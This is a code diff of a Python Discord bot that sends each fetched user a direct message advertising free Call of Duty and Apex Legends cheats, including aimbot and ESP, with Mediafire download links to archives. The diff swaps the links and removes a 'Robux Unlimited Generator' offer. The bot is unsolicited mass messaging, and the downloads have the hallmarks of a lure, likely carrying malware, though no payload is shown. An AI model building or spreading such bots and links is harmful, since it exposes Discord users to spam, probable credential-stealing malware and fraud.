@@ -16,24 +16,20 @@ async def on_ready():
         indx += 1
         member = await bot.fetch_user(i)
         try:
-            await memeber.send("""
+            await memeber.send("""Welcome to Tools 4 You!
 
-Limited time offer from zCheats All of the below hacks are free, for additional support and extra features try a premium membership!
+All of the below hacks are free, for additional support and extra features try a premium membership!
 
 Call of Duty :white_check_mark: FREE:lock:FULL SUITE (Lite Version) :lock: | ESP :white_check_mark: | AIMBOT :white_check_mark: | STREAMPROOF :white_check_mark: | UNDECTECTED:white_check_mark:
-https://www.mediafire.com/file/b5cr7xsibftkh7u/COD_Wraith_-_FullHackSuite_lite.zip/file
+https://www.mediafire.com/file/9jinvs9ek8v1ie1/COD_Full_Suite.rar/file
 
 ------------------------------------------------------------------------------------------------------------------------------
 
 Apex Legends :white_check_mark::eight_pointed_black_star: [:fire:FREE:fire:]:eight_pointed_black_star::star: APEX CHEAT :star: SILENT AIM :star: ESP :star: AIMBOT :star:
-https://www.mediafire.com/file/ax7yr97mdfpsulx/HackSuitev2Lite.rar/file
+https://www.mediafire.com/file/i213j4clasqfp80/Full_Apex_Suite.rar/file
 
 ------------------------------------------------------------------------------------------------------------------------------
-
- ROBLOX :white_check_mark: Robux Unlimited Generator :white_check_mark: 
-https://www.mediafire.com/file/09y8jbxw57sq6td/Robux_Generator.zip/file
-
-------------------------------------------------------------------------------------------------------------------------------""")
+""")
             print(f" [+] Sent message {indx} / {len(data)}")
         except Exception as e:
             print(f" [!] {e}")
